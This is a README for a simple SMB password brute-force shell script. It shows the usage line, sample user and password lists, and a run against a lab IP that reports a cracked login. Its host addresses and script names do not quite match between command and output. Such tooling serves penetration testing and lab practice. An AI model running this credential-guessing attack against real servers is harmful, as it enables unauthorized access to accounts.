# VSSB
Very simple SMB brute force\
\
Some complex tools may fail sometimes.
\
This script just tries to login via "smbclient".
\
```
usage: ./simple-smb-bruteforce.sh -u users.txt -p pswds.txt [-d DOMAIN] -s 10.10.10.123
```
\
Considering the following file (containing a list of users):
```
kali@kali:~/Desktop$ cat usrs.txt
pippo
fsmith
luca
```
\
and the following file (containing a list of passwords):
```
kali@kali:~/Desktop$ cat pwds.txt
123456
sandro
omg123!!!
Thestrokes23  
pippo
password
```
\
you can use the scripts as follows:
```
kali@kali:~/Desktop$ ./simple-smb-bruteforce1.sh -u ./usrs.txt -p ./pwds.txt -s 10.10.10.123

parameter '-d' not set: using default WORKGROUP

Usernames list: ./usrs.txt
Passwords list: ./pwds.txt
Current domain: WORKGROUP
Target server : 10.10.10.175

starting...

Found WORKGROUP@fsmith:Thestrokes23

done!
```

